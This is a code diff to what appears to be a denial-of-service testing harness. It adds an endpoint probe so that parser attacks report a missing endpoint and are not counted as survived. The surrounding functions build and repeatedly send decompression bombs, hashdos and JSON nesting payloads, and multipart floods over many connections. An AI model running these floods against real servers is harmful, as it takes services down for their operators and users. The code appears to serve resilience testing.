@@ -410,11 +410,42 @@ def _gzip_bomb(size):
     return bytes(out)
 
 
-def _h1_request_flood(args, req):
+def _no_endpoint():
+    return dict(endpoint_missing=True, established=0, reaped=0, connect_errors=0,
+                frames_sent=0, bytes_sent=0)
+
+
+def _endpoint_present(args, path):
+    """Probe `path` with a tiny POST; False if the entry answers 404/405/501 (it
+    doesn't implement the endpoint) so the attack can report "no-endpoint" rather
+    than a meaningless "survived". Any other status (or an unreadable probe) is
+    treated as present — the attack then runs and the server-side signal decides."""
+    try:
+        s = _open(args.host, args.port, args.tls, ["http/1.1"] if args.tls else None)
+        s.settimeout(5)
+        body = b"a=1"
+        s.sendall((f"POST {path} HTTP/1.1\r\nHost: {args.host}\r\n"
+                   f"Content-Type: application/x-www-form-urlencoded\r\n"
+                   f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body)
+        head = s.recv(64)
+        try:
+            s.close()
+        except OSError:
+            pass
+        parts = head.split(b" ")
+        code = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
+        return code not in (404, 405, 501)
+    except OSError:
+        return True
+
+
+def _h1_request_flood(args, req, require_endpoint=None):
     """N connections each send one fixed HTTP/1.1 request repeatedly until the
     deadline. The shared engine behind every payload/parser attack; `frames_sent`
-    counts requests. These are differential: a request only bites a server that
-    actually parses the body/headers it targets."""
+    counts requests. The parser attacks pass `require_endpoint` so a target without
+    that endpoint reports "no-endpoint" instead of a meaningless "survived"."""
+    if require_endpoint is not None and not _endpoint_present(args, require_endpoint):
+        return _no_endpoint()
     deadline = time.monotonic() + args.duration
     stats = _new_stats()
     lock = threading.Lock()
@@ -464,7 +495,7 @@ def decompression_bomb(args):
     req = ((f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
             f"Content-Encoding: gzip\r\nContent-Type: application/octet-stream\r\n"
             f"Content-Length: {len(bomb)}\r\n\r\n").encode() + bomb)
-    return _h1_request_flood(args, req)
+    return _h1_request_flood(args, req, require_endpoint=args.path)
 
 
 def hashdos(args):
@@ -474,7 +505,7 @@ def hashdos(args):
     req = ((f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
             f"Content-Type: application/x-www-form-urlencoded\r\n"
             f"Content-Length: {len(body)}\r\n\r\n").encode() + body)
-    return _h1_request_flood(args, req)
+    return _h1_request_flood(args, req, require_endpoint=args.path)
 
 
 def json_nesting_bomb(args):
@@ -484,7 +515,7 @@ def json_nesting_bomb(args):
     req = ((f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
             f"Content-Type: application/json\r\n"
             f"Content-Length: {len(body)}\r\n\r\n").encode() + body)
-    return _h1_request_flood(args, req)
+    return _h1_request_flood(args, req, require_endpoint=args.path)
 
 
 def multipart_flood(args):
@@ -497,7 +528,7 @@ def multipart_flood(args):
     req = ((f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n").encode()
            + b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
            + f"Content-Length: {len(body)}\r\n\r\n".encode() + body)
-    return _h1_request_flood(args, req)
+    return _h1_request_flood(args, req, require_endpoint=args.path)
 
 
 def redos_headers(args):
@@ -813,7 +844,7 @@ def decomp_codec_bypass(args):
     req = ((f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
             f"Content-Encoding: deflate\r\nContent-Type: application/octet-stream\r\n"
             f"Content-Length: {len(bomb)}\r\n\r\n").encode() + bomb)
-    return _h1_request_flood(args, req)
+    return _h1_request_flood(args, req, require_endpoint=args.path)
 
 
 def qvalue_cpu_bomb(args):
@@ -858,7 +889,7 @@ def json_bignum(args):
     req = ((f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
             f"Content-Type: application/json\r\n"
             f"Content-Length: {len(body)}\r\n\r\n").encode() + body)
-    return _h1_request_flood(args, req)
+    return _h1_request_flood(args, req, require_endpoint=args.path)
 
 
 # ── WebSocket attack toolkit ─────────────────────────────────────────────────
